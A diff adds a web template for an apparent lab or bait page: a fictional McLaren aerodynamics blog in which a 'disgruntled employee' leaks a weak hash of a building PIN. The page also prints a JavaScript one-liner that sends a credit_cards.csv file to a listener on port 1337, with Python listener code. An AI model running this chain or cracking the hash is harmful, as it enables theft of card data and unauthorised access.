@@ -1,0 +1,99 @@
+{% extends "base.html" %}
+{% block body %}
+<style>
+  body {
+    background: url('{{ url_for("static", filename="racing_background.png") }}')
+                no-repeat center center fixed;
+    background-size: cover;
+    font-family: 'Orbitron', sans-serif;
+    color: white;
+  }
+
+  .blog-container {
+    background: rgba(0, 0, 0, 0.8);
+    padding: 2em;
+    border-radius: 10px;
+    max-width: 800px;
+    margin: 2em auto;
+    box-shadow: 0 0 15px #e10600;
+    border: 2px solid #e10600;
+  }
+
+  h1, h2 {
+    color: #e10600;
+    text-shadow: 0 0 8px black;
+  }
+
+  p {
+    line-height: 1.5em;
+    font-size: 1.1em;
+    text-shadow: 0 0 4px black;
+  }
+
+  .meta {
+    font-size: 0.9em;
+    color: #bbb;
+    margin-top: -1em;
+    margin-bottom: 1em;
+  }
+</style>
+
+<div class="blog-container">
+  <h1>McLaren Performance Blog</h1>
+  <h2>Why Aerodynamics Wins Races</h2>
+  <p class="meta">Posted by Team Aero | June 2025</p>
+  <p>
+    In high-speed motorsport, drag isn't just an annoyance — it's the difference
+    between pole position and the midfield. Our 2025 chassis includes a redesigned
+    front wing with variable-angle elements that adapt at speed for optimal balance.
+  </p>
+  <p>
+    Combined with a ground-effect tunnel that maximizes downforce without drag
+    penalties, we’ve seen a consistent 0.3s improvement in sector 2 lap times.
+  </p>
+  <p>
+    Anyway here is the building pin. I can't just post it on the website, but here is a weak hash: 9cd6d894098e748716960bfcf9dbe115.
+    I wish my company appreciated me more. 
+  </p>
+  <p> Can I just talk about my interests for a minute. No one ever listens to me. I was playing around with Javascript and discovered this one-liner that would look for a file called credit_cards.csv in a share folder and then dump the contents to anything listening on port 1337. I sure hope we don't have anything like that. Surely this company would not store the travel credit card numbers on a public facing website. 
+<pre style="white-space: pre-wrap; word-break: break-word;"><code>
+&lt;script&gt;fetch('/share/credit_cards.csv').then(r =&gt; r.text()).then(d =&gt; fetch('http://127.0.0.1:1337/?cred_cards=' + encodeURIComponent(d), {method:'POST', mode:'no-cors', body:d}));&lt;/script&gt;
+</code></pre>
+
+<p> Then theoretically you could start a basic HTTP listener by running the following in the command line.</p>
+
+<pre style="white-space: pre-wrap; word-break: break-word;"><code class="language-python">
+python3 -m http.server 1337
+</pre></code>
+
+<p>If you want a more useful POST listener, then you can start one in python by writing something like this into a file called listener.py </p>
+
+<pre style="white-space: pre-wrap; word-break: break-word;"><code class="language-python">
+from http.server import HTTPServer, BaseHTTPRequestHandler
+
+class Listener(BaseHTTPRequestHandler):
+    def do_POST(self):
+        length = int(self.headers.get("Content-Length", 0))
+        body   = self.rfile.read(length).decode()
+        print("Received:\n", body[:200])
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b"ok")
+
+if __name__ == "__main__":
+    print("Listener started on port 127.0.0.1:1337")
+    print("Enter Ctrl-C to kill process")
+    HTTPServer(("0.0.0.0", 1337), Listener).serve_forever()
+</code></pre>
+
+<p> Then if you had listener.py in your working directory you could run </p>
+
+<pre style="white-space: pre-wrap; word-break: break-word;"><code class="language-python">
+python3 listener.py
+</code></pre>
+
+<p> Alternatively, you could start a python3 shell by typing python3 into a Linux terminal and then paste the above codeto run it </p>
+
+</div>
+{% endblock %}
+
